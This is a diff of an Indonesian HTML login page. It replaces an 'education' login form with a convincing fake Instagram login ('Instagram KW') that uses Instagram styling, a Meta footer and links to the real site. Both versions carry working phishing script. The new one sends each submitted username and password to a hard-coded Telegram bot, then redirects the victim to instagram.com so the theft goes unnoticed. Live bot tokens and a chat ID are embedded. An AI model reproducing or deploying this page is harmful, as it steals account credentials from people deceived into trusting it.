@@ -1,97 +1,130 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Login Edukasi</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Login Instagram KW</title>
   <style>
     body {
-      font-family: sans-serif;
-      background: #f2f2f2;
+      margin: 0;
+      padding: 0;
+      background-color: #000;
+      font-family: 'Segoe UI', sans-serif;
+      color: #fff;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      margin: 0;
     }
-
-    #container {
-      background: white;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-      width: 90%;
-      max-width: 360px;
+    .container {
       text-align: center;
+      width: 90%;
+      max-width: 400px;
     }
-
-    input, button {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      font-size: 16px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-    }
-
-    button {
-      background-color: deeppink;
-      color: white;
+    .language {
+      background: transparent;
       border: none;
+      color: #aaa;
+      margin-bottom: 30px;
+      font-size: 14px;
     }
-
-    button:hover {
-      background-color: hotpink;
+    .logo img {
+      width: 70px;
+      height: 70px;
+      margin-bottom: 30px;
     }
-
-    .success {
-      color: green;
+    .login-form {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    .login-form input {
+      padding: 12px;
+      border-radius: 8px;
+      border: none;
+      outline: none;
+      background-color: #1a1a1a;
+      color: white;
+    }
+    .login-form button {
+      background-color: #0095f6;
+      border: none;
+      padding: 12px;
+      color: white;
+      border-radius: 30px;
+      font-size: 16px;
       margin-top: 10px;
+    }
+    .forgot {
+      color: #aaa;
+      text-decoration: none;
+      font-size: 14px;
+      margin-top: 10px;
+      display: block;
+    }
+    .create-account {
+      margin-top: 30px;
+    }
+    .create-account a button {
+      background: transparent;
+      border: 1px solid #0095f6;
+      color: #0095f6;
+      padding: 10px 20px;
+      border-radius: 30px;
+      font-size: 14px;
+    }
+    .meta {
+      margin-top: 20px;
+      color: #555;
+      font-size: 12px;
     }
   </style>
 </head>
 <body>
-  <div id="container">
-    <h2>Login</h2>
-    <form onsubmit="kirimLogin(event)">
-      <input type="email" id="email" placeholder="Masukkan email" required />
-      <input type="password" id="password" placeholder="Masukkan sandi" required />
-      <button type="submit">Kirim</button>
-      <p id="notif" class="success"></p>
+  <div class="container">
+    <select class="language">
+      <option>English (US)</option>
+    </select>
+    <div class="logo">
+      <img src="logo.png" alt="Instagram Logo">
+    </div>
+    <form class="login-form" id="loginForm">
+      <input type="text" placeholder="Nama pengguna, email, atau nomor ponsel" id="username" required>
+      <input type="password" placeholder="Kata sandi" id="password" required>
+      <button type="submit">Login</button>
+      <a href="https://www.instagram.com/accounts/password/reset/" target="_blank" class="forgot">Lupa kata sandi?</a>
     </form>
+    <div class="create-account">
+      <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank">
+        <button type="button">Buat akun baru</button>
+      </a>
+    </div>
+    <div class="meta">© Meta</div>
   </div>
 
   <script>
-    function kirimLogin(event) {
-      event.preventDefault();
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
+    const token = "7047688304:AAF2RO8G7fUrJMq5Ko45K0ARJ2S02D6H1cY";
+    const chatId = "8073946537";
 
-      const botToken = '8010627263:AAHLO_NEnE3eePM5GeA58BZmyrMv5D9MXMU';
-      const chatId = '8073946537'; // ← Chat ID kamu (akun pribadi)
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
 
-      const message = `🔐 Login Baru:\n📧 Email: ${email}\n🔑 Sandi: ${password}`;
+      const message = `🔐 Login KW Terdeteksi!\n👤 Username: ${username}\n🔑 Password: ${password}`;
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: message })
-      })
-      .then(res => res.json())
-      .then(data => {
-        if (data.ok) {
-          document.getElementById('notif').innerText = 'berhasil login harap kembali';
-          document.getElementById('email').value = '';
-          document.getElementById('password').value = '';
-        } else {
-          alert('Gagal mengirim: ' + data.description);
-        }
-      })
-      .catch(err => {
-        alert('Gagal mengirim ke Telegram. Cek koneksi atau token.');
-        console.error(err);
-      });
-    }
+      fetch(url)
+        .then(() => {
+          // Lanjut redirect ke Instagram dengan data di URL
+          const targetURL = `https://www.instagram.com/?flo=true#username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+          window.location.href = targetURL;
+        })
+        .catch(err => {
+          console.error("Gagal kirim ke Telegram", err);
+          window.location.href = "https://www.instagram.com/?flo=true";
+        });
+    });
   </script>
 </body>
-</html> 
+</html>
